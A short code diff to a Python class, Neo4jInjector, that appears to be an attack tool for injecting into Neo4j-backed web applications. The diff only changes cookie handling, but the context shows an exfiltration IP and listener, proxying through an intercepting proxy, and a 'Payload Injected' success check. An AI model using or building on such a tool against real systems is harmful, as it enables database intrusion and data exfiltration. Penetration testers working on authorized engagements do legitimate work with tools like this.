@@ -39,11 +39,12 @@ class Neo4jInjector:
         self.exfil_ip = exfil_ip + ":" + str(listen_port)
         self.request_type = request_type
         self.parameters = parameters
+        self.cookie = cookie
         # Check if a cookie was provided and split it into a dictionary if so
-        self.cookie = {cookie.split('=')[0]: cookie.split('=')[1]} if cookie else None
         self.headers = {
             'User-Agent': 'curl/8.5.0',
             'Content-Type': 'application/x-www-form-urlencoded',
+            'Cookie': cookie
         }
         self.proxies = {
             'http': 'http://127.0.0.1:8080',
@@ -74,9 +75,9 @@ class Neo4jInjector:
     def execute_request(self, url, data=None):
         try:
             if self.request_type == "POST":
-                response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, cookies=self.cookie if self.cookie else None)
+                response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies)
             else:
-                response = requests.get(url, headers=self.headers, proxies=self.proxies, cookies=self.cookie if self.cookie else None)
+                response = requests.get(url, headers=self.headers, proxies=self.proxies)
 
             if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                 print(f"Payload Injected")
